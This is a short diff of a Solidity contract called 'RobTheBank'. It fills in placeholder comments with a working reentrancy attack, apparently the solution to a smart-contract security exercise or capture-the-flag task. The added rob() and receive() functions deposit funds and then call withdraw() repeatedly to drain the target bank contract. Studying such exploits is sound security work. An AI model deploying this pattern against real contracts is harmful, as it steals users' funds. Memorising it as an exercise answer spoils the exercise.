@@ -26,11 +26,15 @@ contract RobTheBank {
     }
     
     function rob() public payable {
-        bank.deposit();
-        // your code here
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
     }
 
     receive() external payable {
-        // your code here
+        if (address(bank).balance >= bank.balances(address(this))){
+            bank.withdraw();
+        } else if (address(bank).balance > 0) {
+            return;
+        }
     }
 }
